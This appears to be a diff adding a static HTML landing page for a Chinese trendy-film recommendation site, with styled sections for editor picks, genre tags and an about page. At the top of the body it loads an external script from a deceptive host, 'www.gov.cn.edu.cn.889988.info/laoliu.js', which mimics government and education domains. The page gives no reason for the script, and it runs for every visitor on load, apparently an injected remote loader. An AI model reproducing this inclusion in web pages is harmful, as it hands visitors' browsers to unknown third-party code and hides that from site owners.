@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>33电影网 - 潮流影视在线观看平台</title>
+<meta name="description" content="33电影网（33dianyingwang-h5）以潮流视角精选电影、电视剧、动漫、综艺，个性推荐、独立好片、冷门佳作，告别千篇一律的片单。">
+<meta name="keywords" content="33电影网, 潮流电影, 独立电影, 影视推荐, 电影导航, 33dianyingwang-h5">
+<style>
+:root{
+  --orange:#ff5e1f;
+  --purple:#7b2ff7;
+  --black:#0d0d0d;
+  --white:#fffdf9;
+  --cream:#fff3e6;
+  --gray:#6b6b6b;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Space Grotesk","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--white);
+  color:var(--black);
+  line-height:1.7;
+  overflow-x:hidden;
+}
+
+/* 滚动条装饰条 */
+.scroll-bar{
+  position:fixed;top:0;left:0;height:4px;width:100%;z-index:9999;
+  background:linear-gradient(90deg,var(--orange),var(--purple));
+  transform-origin:left;
+  animation:grow linear;
+  animation-timeline:scroll();
+}
+@keyframes grow{from{transform:scaleX(0)}to{transform:scaleX(1)}}
+
+a{color:var(--purple);text-decoration:none;transition:.2s}
+a:hover{color:var(--orange)}
+
+/* 头部 */
+.header{
+  background:var(--black);
+  color:#fff;
+  position:sticky;top:0;z-index:999;
+}
+.header-in{
+  max-width:1180px;margin:0 auto;padding:1rem;
+  display:flex;justify-content:space-between;align-items:center;gap:1rem;flex-wrap:wrap;
+}
+.logo{
+  font-size:2rem;font-weight:900;letter-spacing:-2px;
+  background:linear-gradient(135deg,var(--orange),var(--purple));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.logo span{font-size:.75rem;color:#888;display:block;letter-spacing:1px;font-weight:400}
+.nav{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav a{
+  padding:.5rem 1rem;border-radius:6px;font-weight:700;font-size:.9rem;color:#ddd;
+}
+.nav a:hover,.nav a.active{
+  background:var(--orange);color:#fff;
+}
+
+.wrap{max-width:1180px;margin:0 auto;padding:0 1rem}
+
+/* Hero */
+.hero{
+  padding:5rem 0 4rem;
+  display:grid;grid-template-columns:1.3fr .7fr;gap:2rem;align-items:center;
+}
+.hero h1{
+  font-size:clamp(2.5rem,8vw,4.5rem);
+  font-weight:900;line-height:.95;letter-spacing:-3px;
+}
+.hero h1 em{
+  font-style:normal;
+  -webkit-text-stroke:2px var(--orange);
+  color:transparent;
+}
+.hero h1 .fill{
+  background:var(--purple);color:#fff;padding:0 .3rem;
+}
+.hero p{
+  margin:1.5rem 0 2rem;font-size:1.1rem;color:var(--gray);max-width:500px;
+}
+.btn-group{display:flex;gap:1rem;flex-wrap:wrap}
+.btn{
+  display:inline-block;padding:.9rem 2rem;font-weight:800;border-radius:8px;
+  font-size:1rem;transition:.25s;
+}
+.btn-main{
+  background:var(--orange);color:#fff;border:3px solid var(--orange);
+}
+.btn-main:hover{background:transparent;color:var(--orange)}
+.btn-ghost{
+  background:transparent;color:var(--black);border:3px solid var(--black);
+}
+.btn-ghost:hover{background:var(--black);color:#fff}
+
+/* 数字33装饰 */
+.big-33{
+  font-size:12rem;font-weight:900;line-height:.8;
+  background:linear-gradient(135deg,var(--orange),var(--purple));
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+  text-align:center;
+  opacity:.15;
+  position:absolute;right:2rem;top:5rem;
+  pointer-events:none;
+}
+.hero{position:relative}
+.hero-card{
+  background:var(--cream);border:3px solid var(--black);border-radius:16px;
+  padding:1.5rem;transform:rotate(3deg);box-shadow:8px 8px 0 var(--orange);
+}
+.hero-card h3{font-size:1.2rem;margin-bottom:.8rem}
+.hero-card .item{
+  display:flex;justify-content:space-between;padding:.5rem 0;
+  border-bottom:2px dotted rgba(0,0,0,.1);font-size:.9rem;
+}
+.hero-card .item:last-child{border:0}
+
+/* 区块 */
+.section{padding:3.5rem 0;border-top:2px solid var(--black)}
+.head{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.head .badge{
+  background:var(--black);color:var(--orange);
+  font-weight:900;font-size:1.1rem;padding:.3rem .8rem;border-radius:6px;
+}
+.head h2{font-size:1.8rem;font-weight:900;letter-spacing:-1px}
+.head .sub{margin-left:auto;color:var(--gray);font-size:.85rem}
+
+/* 片单 - 杂志式大图 */
+.magazine{
+  display:grid;grid-template-columns:1.5fr 1fr;gap:1.5rem;
+}
+.mag-main{
+  background:var(--black);color:#fff;border-radius:16px;padding:2rem;
+  display:flex;flex-direction:column;justify-content:flex-end;min-height:320px;
+  position:relative;overflow:hidden;
+}
+.mag-main::before{
+  content:'33';
+  position:absolute;top:-1rem;right:-.5rem;
+  font-size:8rem;font-weight:900;opacity:.15;
+}
+.mag-main h3{font-size:1.6rem;margin-bottom:.5rem;position:relative}
+.mag-main p{color:#aaa;font-size:.9rem;position:relative;max-width:80%}
+.mag-side{display:grid;gap:1.5rem}
+.mag-side .card{
+  background:var(--cream);border:3px solid var(--black);border-radius:12px;
+  padding:1.2rem;transition:.25s;
+}
+.mag-side .card:hover{transform:translate(-3px,-3px);box-shadow:5px 5px 0 var(--purple)}
+.mag-side .card h3{font-size:1.05rem;margin-bottom:.3rem}
+.mag-side .card p{font-size:.82rem;color:var(--gray)}
+
+/* 潮流标签云 */
+.tag-wall{
+  display:flex;flex-wrap:wrap;gap:.8rem;
+}
+.tag-wall a{
+  display:inline-block;padding:.6rem 1.2rem;
+  border:2px solid var(--black);border-radius:30px;
+  font-weight:700;font-size:.9rem;color:var(--black);
+  transition:.2s;
+}
+.tag-wall a:hover{
+  background:var(--purple);color:#fff;border-color:var(--purple);
+  transform:scale(1.05);
+}
+
+/* 关于 */
+.about{
+  display:grid;grid-template-columns:1fr 1fr;gap:3rem;align-items:center;
+}
+.about-text h3{font-size:1.6rem;font-weight:900;margin-bottom:1rem}
+.about-text p{margin-bottom:1rem;color:var(--gray)}
+.about-visual{
+  background:linear-gradient(135deg,var(--orange),var(--purple));
+  border-radius:20px;padding:2.5rem;text-align:center;color:#fff;
+  transform:rotate(-2deg);
+}
+.about-visual .big{
+  font-size:4rem;font-weight:900;line-height:1;
+  -webkit-text-stroke:3px #fff;color:transparent;
+}
+.about-visual p{margin-top:1rem;font-weight:600}
+
+/* 页脚 */
+.footer{
+  background:var(--black);color:#999;padding:3rem 1rem;text-align:center;margin-top:3rem;
+}
+.footer h3{
+  font-size:2rem;font-weight:900;color:#fff;margin-bottom:.5rem;
+  -webkit-text-stroke:0;
+}
+.footer h3 em{color:var(--orange);font-style:normal}
+.footer p{font-size:.82rem;margin-top:.5rem}
+.footer a{color:var(--orange)}
+
+/* 响应式 */
+@media(max-width:860px){
+  .hero{grid-template-columns:1fr;padding:3rem 0}
+  .big-33{display:none}
+  .magazine{grid-template-columns:1fr}
+  .about{grid-template-columns:1fr}
+}
+@media(max-width:640px){
+  .logo{font-size:1.6rem}
+  .btn-group{flex-direction:column}
+  .btn{text-align:center}
+  .nav a{flex:1;text-align:center;margin-bottom:-3px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="scroll-bar"></div>
+
+<header class="header">
+  <div class="header-in">
+    <div class="logo">
+      33电影网
+      <span>33dianyingwang-h5.github.io</span>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="active">首页</a>
+      <a href="#trending">潮流片单</a>
+      <a href="#genre">类型标签</a>
+      <a href="#about">关于33</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- 首页 -->
+  <section id="home" class="hero">
+    <div class="big-33">33</div>
+    <div>
+      <h1>看片不<em>从众</em><br><span class="fill">33</span> 替你挑</h1>
+      <p>33电影网（33dianyingwang-h5）不做流水线片单，只从潮流视角为你精选独立好片、冷门佳作、个性导演和小众神作。像挑唱片一样挑电影。</p>
+      <div class="btn-group">
+        <a href="#trending" class="btn btn-main">看潮流片单 →</a>
+        <a href="#genre" class="btn btn-ghost">按口味挑</a>
+      </div>
+    </div>
+    <aside class="hero-card">
+      <h3>🔥 本周编辑精选</h3>
+      <div class="item"><span>独立电影周</span><span>8 部</span></div>
+      <div class="item"><span>导演聚焦</span><span>奉俊昊</span></div>
+      <div class="item"><span>冷门高分</span><span>9.0+</span></div>
+      <div class="item"><span>午夜场</span><span>暗黑系</span></div>
+    </aside>
+  </section>
+
+  <!-- 潮流片单 -->
+  <section id="trending" class="section">
+    <div class="head">
+      <span class="badge">01</span>
+      <h2>潮流片单</h2>
+      <span class="sub">Editor's Pick</span>
+    </div>
+    <div class="magazine">
+      <div class="mag-main">
+        <h3>本周主推 · 独立电影特辑</h3>
+        <p>不走院线、不上热搜，但每一部都值得被看见。33电影网编辑部本周精选 8 部全球独立佳作。</p>
+      </div>
+      <div class="mag-side">
+        <div class="card">
+          <h3>🎬 韩国独立新浪潮</h3>
+          <p>洪常秀、李沧东之后的新一代韩国导演，作品带着鲜明的个人风格。</p>
+        </div>
+        <div class="card">
+          <h3>🎞 欧洲艺术片精选</h3>
+          <p>戛纳、柏林、威尼斯获奖/入围的独立制作，镜头语言大胆前卫。</p>
+        </div>
+        <div class="card">
+          <h3>📱 短视频时代的影像实验</h3>
+          <p>用手机拍电影、用AI做特效，新一代创作者的实验性尝试。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 类型标签 -->
+  <section id="genre" class="section">
+    <div class="head">
+      <span class="badge">02</span>
+      <h2>按口味挑片</h2>
+      <span class="sub">Pick Your Vibe</span>
+    </div>
+    <div class="tag-wall">
+      <a href="#">🖤 暗黑系</a>
+      <a href="#">🌊 治愈系</a>
+      <a href="#">🕵️ 烧脑悬疑</a>
+      <a href="#">🎷 文艺腔</a>
+      <a href="#">💥 爽片专场</a>
+      <a href="#">😂 解压喜剧</a>
+      <a href="#">🛸 科幻脑洞</a>
+      <a href="#">🏔 冷峻纪实</a>
+      <a href="#">💔 催泪爱情</a>
+      <a href="#">🎨 视觉系</a>
+      <a href="#">🎤 音乐电影</a>
+      <a href="#">🐉 东方美学</a>
+      <a href="#">🌍 外语独立</a>
+      <a href="#">👻 心理惊悚</a>
+      <a href="#">🏆 冷门高分</a>
+      <a href="#">⚡ 90分钟以内</a>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about" class="section">
+    <div class="head">
+      <span class="badge">03</span>
+      <h2>关于 33</h2>
+      <span class="sub">About Us</span>
+    </div>
+    <div class="about">
+      <div class="about-text">
+        <h3>为什么叫「33」？</h3>
+        <p><strong>33电影网</strong>（https://33dianyingwang-h5.github.io）的"33"代表"三三两两"——一个人看、两个人看、三五好友一起看，都可以。</p>
+        <p>我们不做大而全的资源站，只做"有态度的选片"。潮流、独立、个性、小众，是我们的关键词。页面设计也刻意区别于传统电影站，走街头潮流路线。</p>
+        <p>站内所有分类/播放链接均为 <code>#</code> 占位，后续可对接真实数据源。</p>
+        <p><a href="https://33dianyingwang-h5.github.io">🌐 官网：33dianyingwang-h5.github.io</a></p>
+      </div>
+      <div class="about-visual">
+        <div class="big">33</div>
+        <p>不随大流 · 不交智商税 · 只看好片</p>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>33<em>电影网</em></h3>
+  <p>潮流影视推荐 · 独立好片 · 个性选片</p>
+  <p>© 2026 33电影网 | <a href="https://33dianyingwang-h5.github.io">33dianyingwang-h5.github.io</a></p>
+  <p>本站为静态演示页，所有链接均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+</footer>
+
+<script>
+const links=[...document.querySelectorAll('.nav a')];
+const secs=[...document.querySelectorAll('section[id]')];
+links.forEach(a=>a.addEventListener('click',e=>{
+  const id=a.getAttribute('href');
+  if(id&&id.startsWith('#')&&document.querySelector(id)){
+    e.preventDefault();
+    document.querySelector(id).scrollIntoView({behavior:'smooth',block:'start'});
+  }
+}));
+addEventListener('scroll',()=>{
+  let cur='home';
+  secs.forEach(s=>{if(scrollY>=s.offsetTop-120)cur=s.id;});
+  links.forEach(l=>l.classList.toggle('active',l.getAttribute('href')==='#'+cur));
+});
+</script>
+</body>
+</html>
